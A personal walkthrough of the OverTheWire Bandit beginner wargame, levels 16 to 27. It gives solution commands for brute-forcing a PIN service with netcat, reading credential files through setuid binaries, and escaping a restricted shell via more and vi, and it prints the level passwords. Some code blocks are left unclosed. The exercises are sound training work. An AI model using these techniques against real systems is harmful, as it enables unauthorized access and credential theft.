## üìù Bandit

The Bandit wargame is aimed at absolute beginners. It will teach the basics needed to be able to play other wargames. **If you notice something essential is missing or have ideas for new levels, please let us know!**

### Note for beginners

This game, like most other games, is organized in levels. You start at Level 0 and try to ‚Äúbeat‚Äù or ‚Äúfinish‚Äù it. Finishing a level results in information on how to start the next level. The pages on this website for ‚ÄúLevel <X>‚Äù contain information on how to start level X from the previous level. E.g. The page for [Level 1](https://overthewire.org/wargames/bandit/bandit1.html) has information on how to gain access from [Level 0](https://overthewire.org/wargames/bandit/bandit0.html) to [Level 1](https://overthewire.org/wargames/bandit/bandit1.html). All levels in this game have a page on this website, and they are all linked to from the sidemenu on the left of this page.

You will encounter many situations in which you have no idea what you are supposed to do. **Don‚Äôt panic! Don‚Äôt give up!** The purpose of this game is for you to learn the basics. Part of learning the basics, is reading a lot of new information.

There are several things you can try when you are unsure how to continue:

- First, if you know a command, but don‚Äôt know how to use it, try the **manual** ([man page](https://en.wikipedia.org/wiki/Man_page)) by entering ‚Äú**man <command>**‚Äù (without the quotes). e.g. if you know about the ‚Äúls‚Äù command, type: man ls. The ‚Äúman‚Äù command also has a manual, try it. Press q to quit the man command.
- Second, if there is no man page, the command might be a **shell built-in**. In that case use the ‚Äú**help <X>**‚Äù command. E.g. help cd
- Also, your favorite **search-engine** is your friend. Learn how to use it! I recommend [Google](https://www.google.com/).
- Lastly, if you are still stuck, you can [join us via chat](https://overthewire.org/information/chat.html)

You‚Äôre ready to start! Begin with [Level 0](https://overthewire.org/wargames/bandit/bandit0.html), linked at the left of this page. Good luck!

**Note for VMs:** You may fail to connect to [overthewire.org](http://overthewire.org/) via SSH with a ‚Äú*broken pipe error*‚Äù when the network adapter for the VM is configured to use NAT mode. Adding the setting **IPQoS throughput** to /etc/ssh/ssh_config should resolve the issue. If this does not solve your issue, the only option then is to change the adapter to Bridged mode.

- **SSH Information**
    - Host: [bandit.labs.overthewire.org](http://bandit.labs.overthewire.org/)
    - Port: 2220

## Bandit Level 16 ‚Üí Level 17

**Level Goal**

The credentials for the next level can be retrieved by submitting the password of the current level to **a port on localhost in the range 31000 to 32000**. First find out which of these ports have a server listening on them. Then find out which of those speak SSL and which don‚Äôt. There is only 1 server that will give the next credentials, the others will simply send back to you whatever you send to it.

## Bandit Level 17 ‚Üí Level 18

**Level Goal**

There are 2 files in the homedirectory: **passwords.old and [passwords.ne](http://passwords.ne/)w**. The password for the next level is in [**passwords.ne](http://passwords.ne/)w** and is the only line that has been changed between **passwords.old and [passwords.ne](http://passwords.ne/)w**

**NOTE: if you have solved this level and see ‚ÄòByebye!‚Äô when trying to log into bandit18, this is related to the next level, bandit19**

**Helpful commands**

## Bandit Level 18 ‚Üí Level 19

**Level Goal**

The password for the next level is stored in a file **readme** in the homedirectory. Unfortunately, someone has modified **.bashrc** to log you out when you log in with SSH.

**Helpful commands**

ssh, ls, cat

```bash
ssh bandit18@bandit.labs.overthewire.org -p 2220 "cat readme"
bandit18@bandit.labs.overthewire.org's password:

IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
```

---

## Bandit Level 19 ‚Üí Level 20

**Level Goal**

To gain access to the next level, you should use the setuid binary in the homedirectory. Execute it without arguments to find out how to use it. The password for this level can be found in the usual place (/etc/bandit_pass), after you have used the setuid binary.

**Helpful Reading Material**

- [setuid on Wikipedia](https://en.wikipedia.org/wiki/Setuid)

```bash
bandit19@bandit:~$ ./bandit20-do
Run a command as another user.
¬† Example: ./bandit20-do id

./bandit20-do cat /etc/bandit_pass/bandit20
GbKksEFF4yrVs6il55v6gwY5aVje5f0j
```

---

## Bandit Level 20 ‚Üí Level 21

**Level Goal**

There is a setuid binary in the homedirectory that does the following:

- it makes a connection to localhost on the port you specify as a commandline argument.
- It then reads a line of text from the connection and compares it to the password in the previous level (bandit20).
- If the password is correct, it will transmit the password for the next level (bandit21).

**NOTE:** Try connecting to your own network daemon to see if it works as you think

**Helpful commands**

ssh, nc, cat, bash, screen, tmux, Unix ‚Äòjob control‚Äô (bg, fg, jobs, &, CTRL-Z, ‚Ä¶)

```bash
# Terminal 1
bandit20@bandit:~$ nc -lp 32000 < /etc/bandit_pass/bandit20
gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr

# Terminal 2
bandit20@bandit:~$ ./suconnect 32000
Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
Password matches, sending next password

gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
```

## Bandit Level 21 ‚Üí Level 22

**Level Goal**

A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**Helpful commands**

cron, crontab, crontab(5) (use ‚Äúman 5 crontab‚Äù to access this)

```bash
bandit21@bandit:~$ ls -la /etc/cron.d/

## Bandit Level 22 ‚Üí Level 23

**Level Goal**

A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** Looking at shell scripts written by other people is a very useful skill. The script for this level is intentionally made easy to read. If you are having problems understanding what it does, try executing it to see the debug information it prints.

**Helpful commands**

cron, crontab, crontab(5) (use ‚Äúman 5 crontab‚Äù to access this)

```bash
bandit22@bandit:~$ cat /etc/cron.d/cronjob_bandit23

## Bandit Level 23 ‚Üí Level 24

**Level Goal**

A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around‚Ä¶

## Bandit Level 24 ‚Üí Level 25

**Level Goal**

A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.

```bash
bandit24@bandit:~$ nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.

mktemp -d
/tmp/tmp.OTU1lR6vjK

nano brutepin.sh
#!/bin/bash
for i in {0000..9999}
do
¬† ¬† ¬† ¬† echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i"
done

chmod 700 brutepin.sh
./brutepin.sh > pwpluspin.txt
nc localhost 30002 < pwpluspin.txt
Correct!
The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
```

## Bandit Level 25 ‚Üí Level 26

**Level Goal**

Logging in to bandit26 from bandit25 should be fairly easy‚Ä¶ The shell for user bandit26 is not **/bin/bash**, but something else. Find out what it is, how it works and how to break out of it.

**Helpful commands**

ssh, cat, more, vi, ls, id, pwd

```bash
cat /etc/passwd | grep bandit26
bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
cat /usr/bin/showtext
#!/bin/sh
export TERM=linux
more ~/text.txt
exit 0

ls
bandit25@bandit:~$ ssh -i bandit26.sshkey bandit26@localhost
# Reduce the size of the terminal to enable 'more' to paging through text one screenful at a time.
# Max height = 6

# Press 'v' to start vi
# Then, in vi type ':e /etc/bandit_pass/bandit26'

## Bandit Level 26 ‚Üí Level 27

**Level Goal**

Good job getting a shell! Now hurry and grab the password for bandit27!

**Helpful commands**

ls

```bash
:set shell=/bin/bash
:!ls -la

total 36
drwxr-xr-x¬† 3 root¬† ¬†  root¬† ¬†  4096 May¬† 7¬† 2020 .
drwxr-xr-x 41 root¬† ¬†  root¬† ¬†  4096 May¬† 7¬† 2020 ..
-rwsr-x---¬† 1 bandit27 bandit26 7296 May¬† 7¬† 2020 bandit27-do

:! ./bandit27-do cat /etc/bandit_pass/bandit27
3ba3118a22e93127a4ed485be72ef5ea
```

***Explanation:** In the first part we figure that the fake shell read a file with more and exit. As the content of the file is not long enough, we need to reduce the size of the terminal to enable more to paging through text one screenful at a time. Once more is running we can type **v** to open vi and execute command through that tool. Same thing for the second part except the bandit27-do command will give us the password.*
